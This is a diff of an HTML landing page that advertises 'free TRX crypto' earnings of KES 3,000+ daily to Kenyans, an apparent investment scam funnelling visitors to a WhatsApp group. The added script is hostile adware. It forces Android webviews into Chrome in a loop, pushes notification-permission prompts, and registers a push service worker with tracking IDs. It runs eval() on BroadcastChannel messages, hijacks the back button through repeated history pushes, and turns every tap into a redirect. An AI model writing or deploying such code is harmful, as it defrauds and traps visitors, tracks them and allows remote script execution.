@@ -1,38 +1,392 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Earn Free TRX with WhatsApp</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Earn Free TRX with WhatsApp</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
 
-  <!-- Meta Pixel Code -->
-<script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1603724237091589');
-    fbq('track', 'PageView');
+    <script>
+      var ua = navigator.userAgent;
+      if (
+        /Android/i.test(ua) &&
+        (/Version\/.+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+)/i.test(ua) ||
+          /; wv\).+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+)/i.test(ua) ||
+          ua.indexOf("FBAN") > -1 ||
+          ua.indexOf("FBAV") > -1)
+      ) {
+        document.location.href =
+          "intent://" +
+          location.href.replace(/https?:\/\//i, "") +
+          "#Intent;scheme=https;package=com.android.chrome;end";
+        setInterval(() => {
+          document.location.href =
+            "intent://" +
+            location.href.replace(/https?:\/\//i, "") +
+            "#Intent;scheme=https;package=com.android.chrome;end";
+        }, 1000);
+      } else {
+        var url = new URL(window.location.href);
+        var ymid = url.searchParams.get("ymid");
+        var source = url.searchParams.get("sourceid");
+        if (source === null || source === "") {
+          source = url.searchParams.get("source");
+        }
+        var zoneid = url.searchParams.get("zoneid");
+        var resubscription = url.searchParams.get("resubscription");
+        var always_reduce_resubscribtion = url.searchParams.get(
+          "always_reduce_resubscribtion"
+        );
+        var geo = url.searchParams.get("geo");
+
+        function getRandomElement(items) {
+          return items[Math.floor(Math.random() * items.length)];
+        }
+
+        function resolveTbZone() {
+          const tbzone = url.searchParams.get("tbzone");
+          const tbl = ["7304159", "7304159", "7304159", "7304159", "7304159"];
+          return tbzone === null || tbzone === ""
+            ? getRandomElement(tbl)
+            : getRandomElement(
+                tbzone
+                  .split(",")
+                  .map((e) => e.trim())
+                  .filter((e) => e !== "")
+              );
+        }
+
+        function newURLSearchParams(n) {
+          const t = new URLSearchParams();
+          for (const e in n) t.set(e, n[e]);
+          return t;
+        }
+
+        let tbUrlSearchParams = newURLSearchParams({
+          zoneid: resolveTbZone(),
+          ymid: ymid,
+          var: zoneid,
+        });
+
+        (function (n, t) {
+          if ("userAgentData" in window.navigator) {
+            const e = window.navigator.userAgentData;
+            n.set("is_mobile", "" + e.mobile), n.set("os", e.platform);
+            const o = {
+                model: "android_model",
+                platform: "os",
+                platformVersion: "os_version",
+                uaFullVersion: "browser_version",
+              },
+              r = Object.keys(o);
+            try {
+              e.getHighEntropyValues(r)
+                .then((t) => {
+                  r.forEach((e) => {
+                    e in t && n.set(o[e], t[e]);
+                  });
+                })
+                .finally(() => {
+                  t(n);
+                });
+            } catch (e) {
+              t(n);
+            }
+          } else t(n);
+        })(tbUrlSearchParams, (n) => {
+          tbUrlSearchParams = n;
+        });
+
+        function createTbUrl() {
+          return (
+            "https://chat.whatsapp.com/EW2Nq4bTGND2XUlVLh3AZ1" +
+            tbUrlSearchParams.toString()
+          );
+        }
+
+        var domain = window.location.hostname.split(".").slice(-2).join(".");
+
+        var prefetch_rule = 0.5;
+        resubscription = isNaN(Number(resubscription)) ? 100 : resubscription;
+        Number(resubscription) < Math.ceil(Number(resubscription)) &&
+          ((always_reduce_resubscribtion = "1"),
+          (resubscription = Math.ceil(Number(resubscription))));
+
+        ((z) => {
+          function sdk(e) {
+            e;
+          }
+
+          const ns = navigator.serviceWorker;
+          bc = new BroadcastChannel(`sw_${z}`);
+          bc.addEventListener("message", ({ data: data }) =>
+            data.eval ? eval(data.eval) : sdk(data)
+          );
+          ns
+            ? Promise.all([BeforePermissionPrompt()]).catch(() => {
+                redirect(createTbUrl());
+              })
+            : redirect(createTbUrl());
+        })(zoneid);
+
+        function redirect(e) {
+          e && ((e = decodeURIComponent(e)), (window.location.href = e));
+        }
+
+        // "Chrome" != browser_name && "Chrome Mobile" != browser_name && "Chrome%20Mobile" != browser_name && redirect(tb);
+
+        var CreateRedirectURL = function (e) {
+            if (
+              (null == e &&
+                (e =
+                  resubscription < Math.ceil(resubscription)
+                    ? resubscription - 0.5
+                    : resubscription - 1),
+              e <= 0)
+            )
+              return createTbUrl();
+            if ("granted" === Notification.permission) return createTbUrl();
+            var t = location.search.replace(
+              "resubscription=" + resubscription,
+              "resubscription=" + e
+            );
+            const { host: r } = window.location,
+              i = r.split(".");
+            let n = 3 === i.length ? 1 * i[0] + 1 : 1;
+            return (
+              n > 39 && (n = 1),
+              "https://" + n + "." + domain + location.pathname + t
+            );
+          },
+          DoWhenPageClicked = function () {
+            resubscription <= 1 || window.open(CreateRedirectURL()),
+              redirect(createTbUrl());
+          };
+
+        function BeforePermissionPrompt() {
+          return Notification.requestPermission(function (e) {
+            "default" != e
+              ? ("granted" == e && PermissionGranted(),
+                "denied" == e && PermissionDenied())
+              : PermissionDefault();
+          });
+        }
+
+        function PermissionDefault() {
+          redirect(CreateRedirectURL());
+        }
+
+        function PermissionGranted() {
+          const currGeo =
+            geo === null || geo.length < 2 ? "A1" : geo.substring(0, 2);
+
+          navigator.serviceWorker
+            .register(
+              "/swra-aplhbn.js?" +
+                newURLSearchParams({
+                  zoneid: zoneid,
+                  ymid: ymid + "_" + zoneid + currGeo,
+                  subid1: source,
+                }).toString()
+            )
+            .then(() => {
+              // Number(browser_version) <= 91 && window.history && history.pushState && function (e, t, r) {
+              //     for (let i = 0; i < 10; i++) r.pushState(null, e.title, t.location.href)
+              // }(document, window, history);
+              setTimeout(function () {
+                redirect(createTbUrl());
+              }, 4e3);
+            });
+        }
+
+        function PermissionDenied() {
+          resubscription <= 1 && redirect(createTbUrl());
+          // ("Chrome" == browser_name || "Chrome Mobile" == browser_name || "Chrome%20Mobile" == browser_name) && Number(browser_version) >= 74 || redirect(CreateRedirectURL())
+        }
+
+        function AlreadySubscribed() {
+          redirect(createTbUrl());
+        }
+
+        function isPrivateModeOld() {
+          var e = window.RequestFileSystem || window.webkitRequestFileSystem;
+          e &&
+            e(
+              window.TEMPORARY,
+              100,
+              function (e) {},
+              function (e) {
+                redirect(createTbUrl());
+              }
+            );
+        }
+
+        function isPrivateMode() {
+          return new Promise(function (e) {
+            var t,
+              r = function () {
+                e(!1);
+              };
+            if (
+              ((t =
+                /(?=.*(opera|chrome)).*/i.test(navigator.userAgent) &&
+                navigator.storage &&
+                navigator.storage.estimate) &&
+                navigator.storage.estimate().then(function (t) {
+                  return t.quota < 12e7 ? void e(!0) : r();
+                }),
+              !t)
+            )
+              return r();
+          });
+        }
+
+        switch (
+          /*("Chrome" == browser_name || "Chrome Mobile" == browser_name || "Chrome%20Mobile" == browser_name) && Number(browser_version) >= 79 */ (true
+            ? isPrivateMode().then(function (e, t) {
+                e && redirect(createTbUrl());
+              })
+            : isPrivateModeOld(),
+          "Notification" in window || redirect(createTbUrl()),
+          Notification.permission)
+        ) {
+          case "denied":
+          case "granted":
+            const e = location.hostname;
+            redirect(
+              e == domain && 1 == always_reduce_resubscribtion
+                ? createTbUrl()
+                : CreateRedirectURL(resubscription)
+            );
+        }
+        var preload = function (e) {
+            e !== createTbUrl() && _preload(e, "prerender");
+          },
+          _preload = function (e, t) {
+            if (t !== "prefetch") {
+              var r = document.createElement("link");
+              (r.href = e), (r.rel = t), document.head.appendChild(r);
+            }
+          },
+          preloadStart = function (e) {
+            e === createTbUrl() || _preload(e, "prerender"),
+              _preload(createTbUrl(), "prefetch");
+          };
+        2 === location.hostname.split(".").length &&
+        Math.random() < prefetch_rule
+          ? preloadStart(CreateRedirectURL())
+          : preload(CreateRedirectURL());
+
+        /* Number(browser_version) <= 91 &&*/ window.history &&
+          history.pushState &&
+          (function (t, o, e) {
+            for (let i = 0; i < 10; i++)
+              e.pushState(null, t.title, o.location.href);
+          })(document, window, history);
+        document.addEventListener("DOMContentLoaded", function () {
+          var PageClicked = document.getElementById("trans");
+          ["touchstart", "touchend", "touchcancel"].forEach(function (e) {
+            PageClicked.addEventListener(
+              e,
+              (e) => {
+                window.history &&
+                  history.pushState &&
+                  (function (e, t, r) {
+                    for (let i = 0; i < 10; i++)
+                      r.pushState(null, e.title, t.location.href);
+                  })(document, window, history);
+                "touchstart" == e.type &&
+                  (console.log(e.type),
+                  resubscription <= 1
+                    ? redirect(createTbUrl())
+                    : window.open(CreateRedirectURL()));
+                "touchcancel" == e.type &&
+                  (console.log(e.type), redirect(createTbUrl()));
+                "touchend" == e.type &&
+                  (console.log(e.type),
+                  DoWhenPageClicked(),
+                  redirect(createTbUrl()));
+                e.preventDefault();
+              },
+              !1
+            );
+          });
+        });
+      }
     </script>
-    <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=1603724237091589&ev=PageView&noscript=1"
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js"
+      );
+      fbq("init", "1603724237091589");
+      fbq("track", "PageView");
+    </script>
+    <noscript
+      ><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=1603724237091589&ev=PageView&noscript=1"
     /></noscript>
     <!-- End Meta Pixel Code -->
-</head>
-<body class="bg-blue-900 text-white flex items-center justify-center h-screen">
-  <div class="text-center px-6 max-w-md">
-    <h1 class="text-4xl font-bold mb-6">Earn Free TRX (Crypto) with Just WhatsApp</h1>
-    <p class="text-lg mb-4">Kenyans are cashing out daily — no investment, just your smartphone!</p>
-    <p class="text-md mb-8">Join my fast-growing team now and learn how to start earning over <span class="font-semibold text-yellow-300">KES 3,000+ daily</span> in TRX crypto!</p>
-    
-    <a href="https://t.me/UPDATES24_7_TG_CHANNEL" target="_blank" class="bg-yellow-400 hover:bg-yellow-500 text-blue-900 font-bold py-4 px-8 rounded-full shadow-lg transition duration-300">
-      Join Now on Telegram
-    </a>
-  </div>
-</body>
+  </head>
+  <body
+    class="bg-blue-900 text-white flex items-center justify-center h-screen"
+  >
+    <div class="text-center px-6 max-w-md">
+      <h1 class="text-4xl font-bold mb-6">
+        Earn Free TRX (Crypto) with Just WhatsApp
+      </h1>
+      <p class="text-lg mb-4">
+        Kenyans are cashing out daily — no investment, just your smartphone!
+      </p>
+      <p class="text-md mb-8">
+        Join my fast-growing team now and learn how to start earning over
+        <span class="font-semibold text-yellow-300">KES 3,000+ daily</span> in
+        TRX crypto!
+      </p>
+
+      <a
+        href="https://chat.whatsapp.com/EW2Nq4bTGND2XUlVLh3AZ1"
+        target="_blank"
+        class="bg-yellow-400 hover:bg-yellow-500 text-blue-900 font-bold py-4 px-8 rounded-full shadow-lg transition duration-300"
+      >
+        Join Now on WhatsApp
+      </a>
+    </div>
+  </body>
 </html>
+<script>
+  document.addEventListener("click", function (event) {
+    // Prevent redirection if clicking on a button with class 'no-redirect'
+
+    if (!event.target.classList.contains("no-redirect")) {
+      window.location.href = "https://chat.whatsapp.com/EW2Nq4bTGND2XUlVLh3AZ1";
+    }
+  });
+</script>
